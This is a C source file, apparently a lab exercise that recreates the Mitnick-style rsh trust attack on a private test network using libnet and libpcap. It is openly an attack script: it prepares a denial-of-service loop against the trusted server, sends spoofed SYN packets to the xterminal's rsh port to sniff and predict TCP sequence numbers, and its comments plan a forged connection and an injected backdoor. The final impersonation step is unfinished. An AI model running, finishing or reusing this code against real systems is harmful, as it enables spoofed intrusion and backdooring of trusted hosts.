#include <libnet.h>
#include <stdio.h>
#include <stdlib.h>
//#include <common.h>
#include <unistd.h>
#include <pcap.h>


//eth level data -> do I need this??
#define KEVIN_MAC "02:00:ac:10:10:02"
#define SERVER_MAC "02:00:ac:10:10:03"
#define XTERMINAL_MAC "02:00:ac:10:10:04"

//ip level data
char * KEVIN_IP = "172.16.16.2";
char * SERVER_IP = "172.16.16.3";
char * XTERMINAL_IP = "172.16.16.4";

//tcp level data
#define PORT 513
#define PAYLOAD_DOS "disable"
#define PAYLOAD_RST "enable"

//initializations as per tcpdump online documentation
#include <inttypes.h>

typedef unsigned char nd_uint8_t[1];
typedef unsigned char nd_uint16_t[2];
typedef unsigned char nd_uint24_t[3];
typedef unsigned char nd_uint32_t[4];
typedef unsigned char nd_uint40_t[5];
typedef unsigned char nd_uint48_t[6];
typedef unsigned char nd_uint56_t[7];
typedef unsigned char nd_uint64_t[8];

#define SIZE_ETH 14

struct ip_hdr { 
    u_int8_t    ip_vhl;        /* header length, version */
#define IP_V(ip)    (((ip)->ip_vhl & 0xf0) >> 4)
#define IP_HL(ip)    (((ip)->ip_vhl & 0x0f) << 2)
    u_int8_t    ip_tos;        /* type of service */
    u_int16_t    ip_len;        /* total length */
    u_int16_t    ip_id;        /* identification */
    u_int16_t    ip_off;        /* fragment offset field */
#define    IP_DF 0x4000            /* dont fragment flag */
#define    IP_MF 0x2000            /* more fragments flag */
#define    IP_OFFMASK 0x1fff        /* mask for fragmenting bits */
    u_int8_t    ip_ttl;        /* time to live */
    u_int8_t    ip_p;        /* protocol */
    u_int16_t    ip_sum;        /* checksum */
    struct    in_addr ip_src,ip_dst;    /* source and dest address */
};

struct tcp_hdr {
    nd_uint16_t    th_sport;        /* source port */
    nd_uint16_t    th_dport;        /* destination port */
    nd_uint32_t    th_seq;            /* sequence number */
    nd_uint32_t    th_ack;            /* acknowledgement number */
    nd_uint8_t    th_offx2;        /* data offset, rsvd */
    nd_uint8_t    th_flags;
    nd_uint16_t    th_win;            /* window */
    nd_uint16_t    th_sum;            /* checksum */
    nd_uint16_t    th_urp;            /* urgent pointer */
};




//function definitions
int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip);

//shimomura you're doomed
int main (void)
{
	//initialize libnett stuff
	char errbuff[LIBNET_ERRBUF_SIZE];
	libnet_t * l;

	l = libnet_init(LIBNET_RAW4, "eth0", errbuff);
	if (l == NULL)
	{
		printf("libnet init error\n");
		exit(EXIT_FAILURE);
	}

	libnet_seed_prand(l);
	//start DOS part
	//ip conversion
	u_long server_ip = libnet_name2addr4(l, SERVER_IP, LIBNET_DONT_RESOLVE);
	u_long kevin_ip = libnet_name2addr4(l, KEVIN_IP, LIBNET_DONT_RESOLVE);
	u_long xterm_ip = libnet_name2addr4(l, XTERMINAL_IP, LIBNET_DONT_RESOLVE);


	if (server_ip == (u_long) -1)
	{
		printf("error in server ip conversion\n");
		exit(EXIT_FAILURE);
	}
	if (kevin_ip == (u_long) -1)
	{
		printf("error in kevin ip conversion\n");
		exit(EXIT_FAILURE);
	}
	if (xterm_ip == (u_long) -1)
	{
		printf("error in xterm ip conversion\n");
		exit(EXIT_FAILURE);
	}

	//dos the server
	char disable[] = "disable";
	int i;
	printf("Starting the DOS attack\n");
	for (i = 0; i < 15; i++)
	{
		//craft and send 10 packets with "disable" payload
		printf("dos\n");
		//send_syn(513, (uint8_t *) disable, (u_short) strlen(disable), l, server_ip, kevin_ip);
	}
	//now the server will ignore syn acks, that's exactly what I need because my plan is:
		//send spoofed syn, the xterminal will send real synack to the server
		//I will respond with spoofed ack cause I know the server seq num (probing)
		//will have a trusted connection on the xterminal and can inject backdoor

	//contact xterminal to figure out next seq #

	//libpcap setup
	pcap_t *handle;			/* Session handle */
	char *dev;			/* The device to sniff on */
	char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
	struct bpf_program fp;		/* The compiled filter */
	char filter_exp[] = "port 514";	/* The filter expression */
	bpf_u_int32 mask;		/* Our netmask */
	bpf_u_int32 net;		/* Our IP */
	struct pcap_pkthdr header;	/* The header that pcap gives us */
	const u_char *packet;		/* The actual packet */
	const struct ip_hdr *ip_hdr;
	const struct tcp_hdr *tcp_hdr;

	/* Define the device */
	dev = pcap_lookupdev(errbuf);
	if (dev == NULL)
	{
		fprintf(stderr, "Couldn't find default device: %s\n", errbuf);
		return(2);
	}
	/* Find the properties for the device */
	if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1)
	{
		fprintf(stderr, "Couldn't get netmask for device %s: %s\n", dev, errbuf);
		net = 0;
		mask = 0;
	}
	/* Open the session in promiscuous mode */
	handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
	if (handle == NULL)
	{
		fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
		return(2);
	}
	/* Compile and apply the filter */
	if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1)
	{
		fprintf(stderr, "Couldn't parse filter %s: %s\n", filter_exp, pcap_geterr(handle));
		return(2);
	}
	if (pcap_setfilter(handle, &fp) == -1)
	{
			fprintf(stderr, "Couldn't install filter %s: %s\n", filter_exp, pcap_geterr(handle));
			return(2);
	}

	//probe xterminal

	printf("Starting probing\n");
	for (i = 0; i < 5; i++)
	{
		//send syn packets to shell in xterm, with kevin ip, to read the real synack and compute next sequence number
		printf("probe\n");
		send_syn(514, NULL, 0, l, xterm_ip, kevin_ip);
		/* Grab a packet */
		packet = pcap_next(handle, &header);
		/* Print its length */
		printf("Jacked a packet with length of [%d]\n", header.len);

		ip_hdr = (struct ip_hdr*)(packet + SIZE_ETH);
		tcp_hdr = (const struct tcp_hdr*)(packet + SIZE_ETH + sizeof(struct iphdr));

		uint32_t seq = htonl(tcp_hdr->th_seq);

		printf("seq %u\n", seq);

	}

	pcap_close(handle);
	//impersonate trusted server


	exit(EXIT_SUCCESS);
}


int send_syn(uint16_t dest_port, uint8_t *payload, uint32_t payload_s, libnet_t *l, uint32_t server_ip, uint32_t kevin_ip)
{

	libnet_ptag_t t;
	//build syn
	t = libnet_build_tcp(
		libnet_get_prand(LIBNET_PRu16), //sp source port
		dest_port,											//dp destinatin port
		libnet_get_prand(LIBNET_PRu32), //sequence number
    0, 															//ack number, can I send whatever?
    TH_SYN,													//control bit SYN
		2048, 													//window size, random is ok?
		0,															//checksum, if 0 libnet autofills
		10,															//urgent pointer
		LIBNET_TCP_H + payload_s,				//len = tcp header + payload size
		payload,												//payload
		payload_s,											//payload size
		l,															//pointer to libnet context
		0																//protocol tag, 0 to build a new one
	);

	if (t == -1)
	{
		printf("error while crafting tcp syn\n");
		exit(EXIT_FAILURE);
	}


	//build ip fragment containing syn
	t = libnet_build_ipv4(
		LIBNET_IPV4_H + LIBNET_TCP_H + payload_s, //size of the ip packet ,
		0,																				//tos, type of service
		0,																				//id, ip identification
		0,																				//fragmentation bits and offset
		libnet_get_prand(LIBNET_PR8),							//ttl
    IPPROTO_TCP,															//upper protocol
    0,																				//checksum, 0 to autofill
    kevin_ip,																	//src, I use a random fake ip
    server_ip,																//destination
    NULL,																			//payload
    0,																				//payload len
		l,																				//libnet context
		0																					//protocol tag
	);

	if (t == -1)
	{
		printf("error while crafting ip header\n");
		exit(EXIT_FAILURE);
	}

	//send packet
	int success = libnet_write(l);
	if (success == -1)
	{
		printf("error while sending packet\n");
		exit(EXIT_FAILURE);
	}
	else
	{
		printf("sent %d\n", success);
	}

	libnet_clear_packet(l);
	return 1;
}
